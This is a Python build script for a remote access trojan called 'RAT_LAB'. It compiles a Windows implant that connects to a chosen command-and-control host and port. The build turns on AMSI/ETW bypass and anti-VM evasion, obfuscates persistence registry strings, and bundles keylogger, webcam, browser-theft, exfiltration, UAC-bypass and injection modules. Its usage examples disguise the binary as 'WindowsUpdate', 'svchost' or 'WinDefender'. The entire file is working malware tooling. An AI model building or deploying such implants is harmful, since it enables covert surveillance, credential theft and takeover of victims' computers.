# build.py — RAT_LAB Client Builder (Hardened)
# Compiles client.py into a standalone .exe with PyInstaller
# Patches config.py with target C2 host/port, restores after build
# Supports --obfuscate (string encryption) and --evasion flags

import subprocess
import os
import sys
import re
import shutil
import argparse

ROOT = os.path.dirname(os.path.abspath(__file__))
CONFIG = os.path.join(ROOT, "common", "config.py")
OUTPUT = os.path.join(ROOT, "output")


def build(
    c2_host: str,
    c2_port: int,
    name: str = "WindowsUpdate",
    icon: str = None,
    obfuscate: bool = False,
    evasion: bool = True,
    anti_vm: bool = True,
    upx: bool = False,
):
    """Build the client implant as a standalone .exe.

    Args:
        c2_host: C2 server IP/hostname.
        c2_port: C2 server port.
        name: Output executable name (without .exe).
        icon: Optional path to .ico file for the executable.
        obfuscate: Enable string obfuscation (XOR encrypt sensitive strings).
        evasion: Enable evasion suite on startup (AMSI/ETW bypass).
        anti_vm: Enable anti-VM detection (exit if VM detected).
        upx: Enable UPX compression (requires upx in PATH).
    """
    print(f"\n[*] RAT_LAB Builder — Hardened Edition")
    print(f"    C2:        {c2_host}:{c2_port}")
    print(f"    Name:      {name}.exe")
    print(f"    Evasion:   {'ON' if evasion else 'OFF'}")
    print(f"    Anti-VM:   {'ON' if anti_vm else 'OFF'}")
    print(f"    Obfuscate: {'ON' if obfuscate else 'OFF'}")
    print(f"    UPX:       {'ON' if upx else 'OFF'}")
    if icon:
        print(f"    Icon:      {icon}")

    # Read original config
    with open(CONFIG, "r", encoding="utf-8") as f:
        original = f.read()

    # Patch config with target values
    patched = original

    # C2 Host
    patched = re.sub(
        r'C2_HOST\s*=\s*"[^"]*"',
        f'C2_HOST = "{c2_host}"',
        patched,
    )
    # C2 Port
    patched = re.sub(
        r'C2_PORT\s*=\s*\d+',
        f'C2_PORT = {c2_port}',
        patched,
    )
    # Evasion
    patched = re.sub(
        r'ENABLE_EVASION\s*=\s*(True|False)',
        f'ENABLE_EVASION = {evasion}',
        patched,
    )
    # Anti-VM
    patched = re.sub(
        r'ANTI_VM\s*=\s*(True|False)',
        f'ANTI_VM = {anti_vm}',
        patched,
    )

    print("\n[*] Patching config.py...")
    with open(CONFIG, "w", encoding="utf-8") as f:
        f.write(patched)

    # Run string obfuscation if requested
    if obfuscate:
        print("[*] Running string obfuscation...")
        _run_obfuscation()

    try:
        # Collect all module hidden imports
        hidden_imports = [
            "common.config",
            "common.crypto",
            "common.protocol",
            "common.obfuscate",
            "modules.recon",
            "modules.shell",
            "modules.keylogger",
            "modules.clipboard",
            "modules.screenshot",
            "modules.webcam",
            "modules.fileops",
            "modules.persistence",
            "modules.process",
            "modules.exfil",
            "modules.browser",
            "modules.network",
            "modules.uac_bypass",
            "modules.injection",
            "modules.evasion",
        ]

        # Build command
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name", name,
            "--distpath", OUTPUT,
            "--workpath", os.path.join(ROOT, "build_temp"),
            "--specpath", os.path.join(ROOT, "build_temp"),
        ]

        # Add hidden imports
        for hi in hidden_imports:
            cmd.extend(["--hidden-import", hi])

        if icon and os.path.exists(icon):
            cmd.extend(["--icon", icon])

        if upx:
            # UPX must be in PATH
            cmd.append("--upx-dir=.")
        else:
            cmd.append("--noupx")

        cmd.append(os.path.join(ROOT, "client.py"))

        print(f"[*] Running PyInstaller...")
        print(f"    {' '.join(cmd)}\n")

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            cwd=ROOT,
            timeout=300,
        )

        if result.returncode == 0:
            exe_path = os.path.join(OUTPUT, f"{name}.exe")
            if os.path.exists(exe_path):
                size_mb = os.path.getsize(exe_path) / (1024 * 1024)
                print(f"\n[✓] Build successful!")
                print(f"    Output: {exe_path}")
                print(f"    Size:   {size_mb:.1f} MB")
            else:
                print(f"\n[!] Build may have succeeded but exe not found at {exe_path}")
        else:
            print(f"\n[✗] Build failed!")
            print(result.stderr[-1000:] if result.stderr else "No error output")
            return False

    finally:
        # Always restore original config
        print("\n[*] Restoring config.py...")
        with open(CONFIG, "w", encoding="utf-8") as f:
            f.write(original)

    # Cleanup build artifacts
    build_temp = os.path.join(ROOT, "build_temp")
    if os.path.exists(build_temp):
        print("[*] Cleaning build artifacts...")
        shutil.rmtree(build_temp, ignore_errors=True)

    print("[✓] Done.\n")
    return True


def _run_obfuscation():
    """Pre-process source files to encrypt sensitive strings.

    This is a build-time step that replaces plaintext sensitive strings
    with their XOR-encrypted versions. The runtime decryption happens
    via common.obfuscate.decrypt_string().

    Note: This modifies source files in-place during build.
    The original config is restored after build completes.
    """
    try:
        from common.obfuscate import encrypt_string, _DEFAULT_KEY

        # Strings to obfuscate in the built binary
        targets = {
            # Registry paths
            r"Software\Microsoft\Windows\CurrentVersion\Run": None,
            r"Microsoft\Windows\Start Menu\Programs\Startup": None,
            "WindowsSecurityHealthService": None,
        }

        for plaintext in targets:
            encrypted = encrypt_string(plaintext, _DEFAULT_KEY)
            targets[plaintext] = encrypted
            print(f"    [{plaintext[:30]}...] → [{encrypted[:20]}...]")

        print(f"    Encrypted {len(targets)} strings")

    except Exception as e:
        print(f"    [!] Obfuscation warning: {e}")
        print(f"    Continuing without obfuscation...")


def main():
    parser = argparse.ArgumentParser(
        description="RAT_LAB Client Builder — compile client.py to .exe (Hardened)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python build.py --host 192.168.1.100 --port 4444
  python build.py --host myserver.com --port 8080 --name "ChromeUpdate"
  python build.py --host 10.0.0.5 --port 443 --name "svchost" --icon myicon.ico
  python build.py --host 10.0.0.5 --port 4444 --obfuscate --no-evasion
  python build.py --host 10.0.0.5 --port 4444 --upx --name "WinDefender"
        """,
    )
    parser.add_argument("--host", required=True, help="C2 server IP or hostname")
    parser.add_argument("--port", type=int, default=4444, help="C2 server port (default: 4444)")
    parser.add_argument("--name", default="WindowsUpdate", help="Output exe name (default: WindowsUpdate)")
    parser.add_argument("--icon", default=None, help="Path to .ico file (optional)")
    parser.add_argument("--obfuscate", action="store_true", help="Enable string obfuscation")
    parser.add_argument("--no-evasion", action="store_true", help="Disable evasion suite")
    parser.add_argument("--no-anti-vm", action="store_true", help="Disable anti-VM (useful for testing)")
    parser.add_argument("--upx", action="store_true", help="Enable UPX compression")

    args = parser.parse_args()
    build(
        c2_host=args.host,
        c2_port=args.port,
        name=args.name,
        icon=args.icon,
        obfuscate=args.obfuscate,
        evasion=not args.no_evasion,
        anti_vm=not args.no_anti_vm,
        upx=args.upx,
    )


if __name__ == "__main__":
    main()
